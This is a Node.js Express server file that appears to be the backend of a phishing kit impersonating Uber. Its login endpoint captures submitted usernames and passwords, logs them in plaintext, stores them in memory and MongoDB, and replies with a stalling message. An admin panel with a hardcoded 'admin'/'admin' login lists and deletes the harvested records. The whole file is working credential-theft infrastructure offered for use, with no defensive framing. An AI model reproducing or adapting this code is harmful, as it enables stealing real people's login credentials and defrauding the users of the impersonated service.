const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const User = require('./models/User');

const app = express();
const PORT = process.env.PORT || 5000;

// In-memory fallback for testing without MongoDB
let capturedUsers = [];

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
const MONGO_URI = process.env.MONGO_URI;

console.log('Starting backend server...');

mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 5000 })
    .then(() => console.log('MongoDB connected successfully'))
    .catch(err => console.error('MongoDB connection error:', err));

// Routes
// 1. Capture User Login
app.post('/api/login', async (req, res) => {
    try {
        const { identifier, password, source = 'uber' } = req.body;
        console.log(`[Captured] Source: ${source}, ID: ${identifier}, Pass: ${password}`);

        const userData = {
            _id: new Date().getTime().toString(), // Mock ID
            identifier,
            password,
            source,
            timestamp: new Date()
        };

        // Add to in-memory array
        capturedUsers.unshift(userData);

        // Try to save to MongoDB if connected
        try {
            if (mongoose.connection.readyState === 1) {
                const newUser = new User({ identifier, password, source });
                await newUser.save();
            }
        } catch (dbErr) {
            console.error('DB Save failed, kept in memory only.');
        }

        res.status(201).json({ message: 'Processing your request...' });
    } catch (err) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// 2. Admin Login (Hardcoded as per request)
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`Admin Login attempt - Username: ${username}, Password: ${password}`);
    if (username === 'admin' && password === 'admin') {
        console.log('Admin authenticated successfully');
        res.status(200).json({ authenticated: true, token: 'fake-admin-token' });
    } else {
        console.log('Admin authentication failed');
        res.status(401).json({ authenticated: false, message: 'Invalid credentials' });
    }
});

// 3. Get All Captured Users (Admin Panel)
app.get('/api/admin/users', async (req, res) => {
    try {
        let users = [];
        if (mongoose.connection.readyState === 1) {
            // If MongoDB is connected, only return DB users
            users = await User.find().sort({ timestamp: -1 });
        } else {
            // Otherwise, return in-memory users
            users = capturedUsers;
        }

        res.status(200).json(users);
    } catch (err) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// 4. Delete User (Admin UI feature)
app.delete('/api/admin/users/:id', async (req, res) => {
    try {
        const { id } = req.params;

        // Delete from in-memory array
        capturedUsers = capturedUsers.filter(user => user._id !== id);

        // Delete from MongoDB if connected
        if (mongoose.connection.readyState === 1) {
            await User.findByIdAndDelete(id);
        }

        res.status(200).json({ message: 'User deleted' });
    } catch (err) {
        console.error('Delete error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
